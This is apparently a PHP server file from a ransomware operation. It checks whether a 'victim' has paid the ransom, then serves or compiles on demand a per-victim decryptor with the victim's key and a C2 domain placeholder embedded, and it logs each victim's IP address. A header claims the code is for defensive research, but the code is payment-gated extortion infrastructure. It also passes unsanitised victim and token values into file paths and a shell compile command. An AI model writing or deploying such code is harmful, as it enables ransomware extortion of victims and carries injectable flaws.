<?php
/**
 * Decryptor Download API
 * Secure download interface for verified victims
 * For defensive cybersecurity research purposes only
 */

header('Content-Type: application/octet-stream');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

require_once '../database.php';

try {
    $victim_id = $_GET['victim_id'] ?? $_POST['victim_id'] ?? '';
    $download_token = $_GET['token'] ?? $_POST['token'] ?? '';
    
    if (empty($victim_id)) {
        throw new Exception("Missing victim_id parameter");
    }
    
    $db = new Database();
    
    // Verify victim exists and payment is verified
    $victim = $db->getVictimByVictimId($victim_id);
    $payment = $db->getPaymentByVictimId($victim_id);
    
    if (!$victim || !$payment || !$payment['payment_received']) {
        header('Content-Type: application/json');
        echo json_encode([
            'error' => 'Payment not verified or victim not found',
            'victim_id' => $victim_id,
            'payment_status' => $payment['payment_received'] ?? false
        ]);
        exit;
    }
    
    // Check if decryptor exists
    $decryptor_path = "/tmp/decryptors/decryptor_{$victim_id}.exe";
    $web_decryptor_path = "/var/www/html/decryptors/{$download_token}.exe";
    
    $file_to_download = null;
    if (!empty($download_token) && file_exists($web_decryptor_path)) {
        $file_to_download = $web_decryptor_path;
    } elseif (file_exists($decryptor_path)) {
        $file_to_download = $decryptor_path;
    }
    
    if (!$file_to_download) {
        // Generate decryptor on-demand
        $decryptor_path = generateDecryptorOnDemand($victim_id, $victim['encryption_key']);
        if ($decryptor_path) {
            $file_to_download = $decryptor_path;
        } else {
            header('Content-Type: application/json');
            echo json_encode([
                'error' => 'Decryptor not available - generation failed',
                'victim_id' => $victim_id
            ]);
            exit;
        }
    }
    
    // Log download
    error_log("Decryptor downloaded by victim: $victim_id");
    $db->updateDecryptionStatus($victim_id, 'decryptor_downloaded', [
        'download_timestamp' => date('Y-m-d H:i:s'),
        'download_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ]);
    
    // Serve file
    $filename = "file_recovery_tool_{$victim_id}.exe";
    header("Content-Disposition: attachment; filename=\"$filename\"");
    header('Content-Length: ' . filesize($file_to_download));
    header('Cache-Control: no-cache, must-revalidate');
    header('Expires: 0');
    
    readfile($file_to_download);
    
    // Update download count
    $db->updateDecryptionStatus($victim_id, 'decryptor_download_completed', [
        'download_completed_at' => date('Y-m-d H:i:s')
    ]);
    
} catch (Exception $e) {
    error_log("Decryptor download error: " . $e->getMessage());
    
    header('Content-Type: application/json');
    echo json_encode([
        'error' => 'Download system error',
        'details' => $e->getMessage(),
        'timestamp' => time()
    ]);
}

function generateDecryptorOnDemand($victim_id, $encryption_key) {
    try {
        $decryptor_dir = "/tmp/decryptors";
        if (!is_dir($decryptor_dir)) {
            mkdir($decryptor_dir, 0755, true);
        }
        
        $output_file = "$decryptor_dir/decryptor_$victim_id.exe";
        
        // Create source file with embedded key
        $source_template = file_get_contents('/app/victim_client/decryptor_template.cpp');
        $personalized_source = str_replace([
            '{{VICTIM_ID}}', 
            '{{ENCRYPTION_KEY}}',
            '{{C2_DOMAIN}}'
        ], [
            $victim_id,
            $encryption_key,
            'localhost'  // This would be dynamic in production
        ], $source_template);
        
        $source_file = "$decryptor_dir/decryptor_$victim_id.cpp";
        file_put_contents($source_file, $personalized_source);
        
        // Compile decryptor
        $compile_cmd = [
            "g++", 
            "-std=c++17",
            "-O3",
            "-static",
            "-lsodium",
            "-lcurl",
            "-ljsoncpp",
            "-pthread",
            $source_file,
            "-o", $output_file
        ];
        
        $result = shell_exec(implode(' ', $compile_cmd) . ' 2>&1');
        
        if (file_exists($output_file)) {
            // Clean up source
            unlink($source_file);
            return $output_file;
        }
        
        error_log("Failed to compile decryptor: $result");
        return null;
        
    } catch (Exception $e) {
        error_log("On-demand decryptor generation error: " . $e->getMessage());
        return null;
    }
}
?>